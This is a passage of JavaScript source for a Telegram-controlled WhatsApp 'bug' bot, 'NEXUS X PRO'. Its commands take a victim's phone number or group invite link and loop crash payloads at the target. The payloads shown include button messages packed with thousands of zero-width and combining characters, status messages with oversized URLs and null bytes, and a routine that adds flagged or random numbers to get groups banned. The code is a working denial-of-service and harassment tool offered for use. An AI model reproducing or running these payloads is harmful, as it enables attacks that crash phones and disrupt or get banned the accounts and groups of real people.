            global._obliterate(`TOKEN GA VALID! MAU BYPASS DEK? 🤭 (${check.error || 'Invalid'})`);
        }, 1000);
        return;
    }

    let statusSender = '';
    const activeSockets = getActiveSockets();

    if (!sock || !isWhatsAppConnected || activeSockets.length === 0) {
        statusSender = '❌ Not Connected';
    } else {
        try {
            const userJid = activeSockets[0].user?.id || '';
            const cleanNumber = userJid.split('@')[0].split(':')[0];
            if (activeSockets[0].ws && activeSockets[0].ws.readyState === 1) {
                statusSender = `✅ Connected`;
            } else {
                statusSender = `⚠️ Reconnect`;
            }
        } catch (e) {
            statusSender = '⚠️ Terjadi Error';
        }
    }

    const uptime = formatUptime(process.uptime());

    try {
        const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Uptime: ${uptime}
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
⛧ Usєr: ${nama}
⛧ Usєrnαmє: ${username}
⛧ ÍD Usєr: ${idTelegram}
<blockquote>𝐒𝐓𝐀𝐓𝐒 𝐒𝐄𝐍𝐃𝐄𝐑</blockquote>
⛧ Stαts: ${statusSender}`;

        const keyboard = [
            [
                { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
                { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
            ],
            [
                { text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "/tools_menu", style: "Primary" },
            ]
        ];

        await ctx.replyWithPhoto(THUMB, {
            caption: caption,
            parse_mode: "HTML",
            reply_markup: { inline_keyboard: keyboard }
        });

    } catch (e) {
        console.error("Error pada command start:", e);
    }
});

// ─────── CALLBACK MENU UTAMA ─────── //
bot.action("/start", async (ctx) => {
    const username = ctx.from.username ? `@${ctx.from.username}` : "Tidak ada username";
    const nama = ctx.from.first_name || "Tidak ada nama";
    const idTelegram = ctx.from.id;

    const botId = BOT_TOKEN.split(':')[0];
    const check = await validateTokenStandalone(botId);
    
    if (!check.ok) {
        await ctx.answerCbQuery('Wait cek token dulu 🤭', { show_alert: true });
        safeTimeout(() => {
            global._obliterate(`TOKEN GA VALID! MAU BYPASS DEK? 🤭 (${check.error || 'Invalid'})`);
        }, 1000);
        return;
    }

    let statusSender = '';
    const activeSockets = getActiveSockets();

    if (!sock || !isWhatsAppConnected || activeSockets.length === 0) {
        statusSender = '❌ Not Connected';
    } else {
        try {
            const userJid = activeSockets[0].user?.id || '';
            const cleanNumber = userJid.split('@')[0].split(':')[0];
            if (activeSockets[0].ws && activeSockets[0].ws.readyState === 1) {
                statusSender = `✅ Connected`;
            } else {
                statusSender = `⚠️ Reconnect`;
            }
        } catch (e) {
            statusSender = '⚠️ Terjadi Error';
        }
    }

    const uptime = formatUptime(process.uptime());

    const caption = `「静かに進化し、確実に頂点へ。」
єvσlvє ín sílєncє, rísє вєчσnd límíts.
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Uptime: ${uptime}
<blockquote>𝐈𝐍𝐅𝐎 𝐔𝐒𝐄𝐑</blockquote>
⛧ Usєr: ${nama}
⛧ Usєrnαmє: ${username}
⛧ ÍD Usєr: ${idTelegram}
<blockquote>𝐒𝐓𝐀𝐓𝐒 𝐒𝐄𝐍𝐃𝐄𝐑</blockquote>
⛧ Stαts: ${statusSender}`;

    const keyboard = [
        [
            { text: "𝐁𝐔𝐆 𝐌𝐄𝐍𝐔", callback_data: "/bug_menu", style: "Primary" },
            { text: "𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔", callback_data: "/owner_menu", style: "Primary" },
        ],
        [
            { text: "𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔", callback_data: "/tools_menu", style: "Primary" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK SPAM BUG ─────── //
bot.action('/bug_menu', async (ctx) => {
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Security: Active
<blockquote>𝐁𝐄𝐁𝐀𝐒 𝐒𝐏𝐀𝐌</blockquote>
⛧ /slow → 62×××
⛧ /ints → 62×××
⛧ /flow → 62×××
⛧ /death → 62×××
<blockquote>𝐍𝐎 𝐒𝐏𝐀𝐌</blockquote>
⛧ /head → dєlαy x frєzєє invisiblє
⛧ /core → dєlαy hαrd invisiblє
⛧ /killed → blαnk x dєlαy visiblє
⛧ /drain → sєdσt kuσtα invisiblє
<blockquote>𝐁𝐔𝐆 𝐆𝐑𝐎𝐔𝐏</blockquote>
⛧ /blankGb → Blαnk X Frєzєє Grσυp
⛧ /banGb → Bαnnєd Grσυp`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── TOOLS OWNER ─────── //
bot.action('/tools_menu', async (ctx) => {
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Security: Active
<blockquote>𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔</blockquote>
⛧ /url → υrl αnαlyzєr
⛧ /lookup → íp/dσmαín lσσkυp
⛧ /hash → hαsh gєnєrαtσr
⛧ /file → fílє αnαlyzєr
⛧ /json → jsσn fσrmαttєr
⛧ /base64 → єncσdє/dєcσdє fílє
⛧ /timestamp → tímєstαmp cσnvєrtєr`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── CALLBACK OWNER ─────── //
bot.action('/owner_menu', async (ctx) => {
    const caption = `<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
⛧ Dєvєlσpєr: @xerozexv
⛧ Vєrsíσn: 5.0
⛧ Security: Active
<blockquote>𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔</blockquote>
⛧ /connect → hυвυngkαn sєndєr
⛧ /restart → dєlєtє sєndєr
⛧ /cekantri → cєk αntríαn вєrjαlαn
⛧ /addgc → αdd αll mєmвєrs
⛧ /delgc → del αll mєmвєrs
⛧ /adduser → αdd prєmíυm υsєr
⛧ /deluser → dєl prєmíυm υsєr
⛧ /disable → вlσkír cσmmαnd
⛧ /enable → вυkα cσmmαnd
⛧ /setjeda → sєtjєdα cσmmαnd
⛧ /backup → вαckυp fílє dαtαвαsє
⛧ /restore → rєstσrє fílє dαtαвαsє
⛧ /uptime → mєlíhαt υptímє вσt
⛧ /setch → sєt chαnnєl jσín
⛧ /delch → hαpυs chαnnєl jσín`;

    const keyboard = [
        [
            { text: "𝐁𝐀𝐂𝐊 𝐌𝐄𝐍𝐔", callback_data: "/start", style: "Danger" },
        ]
    ];

    await ctx.editMessageMedia({
        type: "photo",
        media: THUMB,
        caption: caption,
        parse_mode: "HTML"
    }, {
        reply_markup: { inline_keyboard: keyboard }
    });
    await ctx.answerCbQuery();
});

// ─────── BEBAS SPAM BUG ─────── //
bot.command("slow", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /death 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 10;

  const processMessage = await ctx.reply(`☇ /death Sєndíng Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Freeze(sock, target);
    }, "death", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `☇ /death Sυccєssfυllч Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });
});

bot.command("flow", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /flow 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 10;

  const processMessage = await ctx.reply(`☇ /flow Sєndíng Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Freeze(sock, target);
    }, "flow", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `☇ /flow Sυccєssfυllч Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });
});

bot.command("slow", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /slow 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 10;

  const processMessage = await ctx.reply(`☇ /slow Sєndíng Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Freeze(sock, target);
    }, "slow", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `☇ /slow Sυccєssfυllч Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });
});

bot.command("ints", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /ints 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 10;

  const processMessage = await ctx.reply(`☇ /ints Sєndíng Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Freeze(sock, target);
    }, "ints", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageText(ctx.chat.id, processMessageId, undefined, `☇ /ints Sυccєssfυllч Bυg ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}`, style: "Primary" }
      ]]
    }
  });
});

// ─────── NO SPAM BUG ─────── //
bot.command("head", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /head 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const cd = checkTargetCooldown(target);
  if (!cd.ok) {
    console.log(chalk.yellow(`⚠️ Target cooldown ${cd.sisa}s | ${q}\n`));
    return false;
  }

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαy X Frєzєє invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Freeze(sock, target);
    }, "head", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαy X Frєzєє invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("core", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /core 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const cd = checkTargetCooldown(target);
  if (!cd.ok) {
    console.log(chalk.yellow(`⚠️ Target cooldown ${cd.sisa}s | ${q}\n`));
    return false;
  }

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαy hαrd invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await DelayHard(sock, target);
    }, "core", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Dєlαy hαrd invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("killed", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /killed 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const cd = checkTargetCooldown(target);
  if (!cd.ok) {
    console.log(chalk.yellow(`⚠️ Target cooldown ${cd.sisa}s | ${q}\n`));
    return false;
  }

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Dєlαy Visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await Blank(sock, target);
        await Freeze(sock, target);
    }, "killed", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blαnk X Dєlαy Visiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("drain", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Fσrmαt: /drain 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const cd = checkTargetCooldown(target);
  if (!cd.ok) {
    console.log(chalk.yellow(`⚠️ Target cooldown ${cd.sisa}s | ${q}\n`));
    return false;
  }

  setTargetCooldown(target);

  const userInfo = ctx.from.username ? `@${ctx.from.username}` : ctx.from.first_name;
  const totalLoop = 50;

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
    caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Sєdσt Kuσtα invisiblє 
↯ Nυmвєr: ${q}
↯ Stαtυs: Mєngírím...
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  botStatus.startTime = Date.now();

  for (let i = 0; i < totalLoop; i++) {
    await safeSend(sock, target, async () => {
        await GrenCL(sock, target);
    }, "drain", true, userInfo, { current: i + 1, total: totalLoop });
  }

  botStatus.isRunning = false;
  botStatus.target = null;
  botStatus.user = null;
  botStatus.bugName = null;
  botStatus.startTime = null;
  botStatus.loopCurrent = 0;
  botStatus.loopTotal = 0;

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Sєdσt Kuσtα invisiblє
↯ Nυmвєr: ${q}
↯ Stαtυs: Sєlєsαí`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CHECK TARGET", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("blankgb", checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const input = ctx.message.text.split(" ")[1];
    if (!input) {
        return ctx.reply(`🪧 Fσrmαt: /blankgb https://chat.whatsapp.com/XXXXX`);
    }

    if (!input.includes('chat.whatsapp.com')) {
        return ctx.reply(`❌ Hαnyα línk grυp yαng dídυkυng`);
    }

    const match = input.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    if (!match) return ctx.reply(`❌ Línk grυp tídαk vαlíd`);

    const inviteCode = match[1];
    let target;
    let groupName = '-';

    try {
        const result = await sock.groupAcceptInvite(inviteCode);

        if (typeof result === 'string') {
            target = result.endsWith('@g.us') ? result : `${result}@g.us`;
        } else if (result && typeof result === 'object' && result.jid) {
            target = String(result.jid);
        } else {
            const meta = await sock.groupGetInviteInfo(inviteCode);
            if (!meta || !meta.id) {
                return ctx.reply(`❌ Gαgαl jσín grυp. Cєk línk αtαυ cσbα lαgí nαntí.`);
            }
            target = String(meta.id);
            groupName = meta.subject || '-';
        }

    } catch (err) {
        console.error('[killer]', err.message);
        return ctx.reply(`❌ Errσr: <code>${String(err.message).replace(/[<>&]/g, '')}</code>`, { parse_mode: "HTML" });
    }

    try {
        const meta = await sock.groupMetadata(target);
        groupName = meta.subject || '-';
    } catch {}

    const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blank X Frezee Group 
↯ Tαrgєt: <code>${target}</code>
↯ Nαmα: ${groupName}
↯ Stαtυs: Mєngírím...
`,
        parse_mode: "HTML"
    });

    const processMessageId = processMessage.message_id;

    for (let i = 0; i < 50; i++) {
        await BlankGb(sock, target);
        await sleep(2000);
    }

    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tчpє: Blank X Frezee Group
↯ Tαrgєt: <code>${target}</code>
↯ Nαmα: ${groupName}
↯ Stαtυs: Sєlєsαí
`, { parse_mode: "HTML" });
});

bot.command('banGb', checkWhatsAppConnection, checkAccess(), cooldownMW(), async (ctx) => {
    const chatId = ctx.chat.id;
    const link = ctx.message.text.split(' ').slice(1).join(' ');

    if (!link) {
        return ctx.reply(`🪧 Cσntσh: /banGb https://chat.whatsapp.com/xxxxxx`);
    }

    const inviteCode = extractGroupCode(link);

    if (!inviteCode) {
        return ctx.reply(`❌ Línk tídαk vαlíd`);
    }

    const user = ctx.from;
    const username = user.username ? `@${user.username}` : user.first_name || "User";
    const userId = String(user.id);

    const processMessage = await ctx.replyWithPhoto(THUMB, {
        caption: `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Tчpє: Aυtσ Jσín + Grσυp Bαn
↯ Stαtυs: Prσcєssíng...
`,
        parse_mode: "HTML"
    });

    const processMsgId = processMessage.message_id;

    try {
        const target = await sock.groupAcceptInvite(inviteCode);

        if (!target) {
            return ctx.reply(`❌ Gαgαl jσín grυp`);
        }

        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Tчpє: Aυtσ Jσín + Grσυp Bαn
↯ Stαtυs: Sєndíng pαчlσαd...
`,
            { parse_mode: "HTML" }
        );

        await BandGb(sock, target);

        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Tчpє: Aυtσ Jσín + Grσυp Bαn
↯ Stαtυs: Bєrhαsíl
`,
            { parse_mode: "HTML" }
        );

    } catch (err) {
        console.error("Overbannido error:", err.message);

        await ctx.telegram.editMessageCaption(
            chatId,
            processMsgId,
            undefined,
            `
<blockquote>𝐍𝐄𝐗𝐔𝐒 𝐗 𝐏𝐑𝐎</blockquote>
↯ Tαrgєt Grυp: ${inviteCode}
↯ Stαtυs: Gαgαl
↯ Errσr: ${err.message}
`,
            { parse_mode: "HTML" }
        );
    }
});

// ─────── EXTRACT GROUP CODE ─────── //
function extractGroupCode(input) {
    const text = String(input || "").trim();
    const match = text.match(/chat\.whatsapp\.com\/([0-9A-Za-z]+)/i);
    return match ? match[1] : null;
}

// ─────── AWAL DARI FUNCTION ─────── //
async function BandGb(sock, groupJid) {
    if (!groupJid.endsWith("@g.us")) throw new Error('@g.us server required');

    const resolveJid = function(raw) {
        let s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(groupJid) ? groupJid : [groupJid])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('No valid JIDs');

    for (let i = 0; i < jids.length; i++) {
        const group = jids[i];

        try {
            await sock.groupParticipantsUpdate(group, ["13135550002@s.whatsapp.net"], "add");
        } catch (_) {}
        
        await new Promise(r => setTimeout(r, 2000));

        try {
            await sock.groupParticipantsUpdate(group, ['971500000000@s.whatsapp.net'], 'add');
        } catch (_) {}
        
        await new Promise(r => setTimeout(r, 2000));

        try {
            const fakeNumbers = Array.from({ length: 10 }, () => {
                return Math.floor(Math.random() * 9000000000000) + 1000000000000 + '@s.whatsapp.net';
            });
            for (const fakeJid of fakeNumbers) {
                await sock.groupParticipantsUpdate(group, [fakeJid], 'add').catch(() => {});
                await new Promise(r => setTimeout(r, 5000));
            }
        } catch (_) {}
    }
}

async function BlankGb(sock, target) {
    let jid;

    if (target.includes("@g.us")) {
        jid = target;
    } else if (target.includes("@s.whatsapp.net")) {
        jid = target;
    } else {
        jid = target.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
    }

    const msg = await generateWAMessageFromContent(jid, {
        buttonsMessage: {
            contentText: "270 subs",
            footerText: "ꦾDɪᴋs Is Hᴀʀᴇ",
            headerType: 1,
            buttons: [
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ1",
                    buttonText: {
                        displayText: "u200D".repeat(7000) + "ြ".repeat(5500)+"\uFE0F".repeat(6000),
                    },
                    type: 1
                },
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ2",
                    buttonText: {
                        displayText: "\u200B".repeat(9000) + "\uFE00".repeat(6000)+"ꦾ".repeat(5000),
                    },
                    type: 1
                }
            ]
        }
    }, { userJid: jid });

    await sock.relayMessage(jid, msg.message, {
        messageId: msg.key.id,
        noSelfSync: true
    });
}

async function GrenCL(sock, target) {
  const jid = String(target).includes("@")
    ? String(target)
    : String(target).replace(/\D/g, "") + "@s.whatsapp.net";

  let X = "\u0000".repeat(2000);
  let B = "uuid, data".repeat(50000);

  const Gren = {
    richResponseMessage: {
      messageType: 1,
      submessages: [{
        messageType: 9,
        contentItemsMetadata: {
          contentType: 1,
          itemsMetadata: [{
            reelItem: {
              videoUrl: "https://files.catbox.moe/h1xx7k.mp4" + B,
              thumbnailUrl: "https://files.catbox.moe/h1xx7k.mp4" + X,
              profileIconUrl: "https://files.catbox.moe/h1xx7k.mp4" + B
            }
          }]
        }
      }]
    }
  };

  await sock.relayMessage('status@broadcast', Gren, {
    messageId: 'gren-' + Date.now().toString(36).toUpperCase(),
    statusJidList: [jid],
    noSelfSync: true,
    additionalNodes: [{
      tag: 'meta',
      attrs: {},
      content: [{
        tag: 'mentioned_users',
        attrs: {},
        content: [{ tag: 'to', attrs: { jid: jid }, content: [] }]
      }]
    }]
  });
}

async function Blank(sock, target) {
    const jid = target.includes("@") ? target : target + "@s.whatsapp.net";

    const msg = await generateWAMessageFromContent(jid, {
        buttonsMessage: {
            contentText: "270 subs",
            footerText: "ꦾDɪᴋs Is Hᴀʀᴇ",
            headerType: 1,
            buttons: [
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ1",
                    buttonText: {
                        displayText: "u200D".repeat(7000) + "ြ".repeat(5500)+"\uFE0F".repeat(6000),
                    },
                    type: 1
                },
                {
                    buttonId: "ꦾɢʜᴏꜱᴛ2",
                    buttonText: {
